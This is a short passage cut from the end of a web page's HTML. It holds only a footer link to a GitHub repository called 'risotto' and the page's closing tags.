href=https://github.com/joeroe/risotto>risotto</a>.</p></footer></div></body></html>
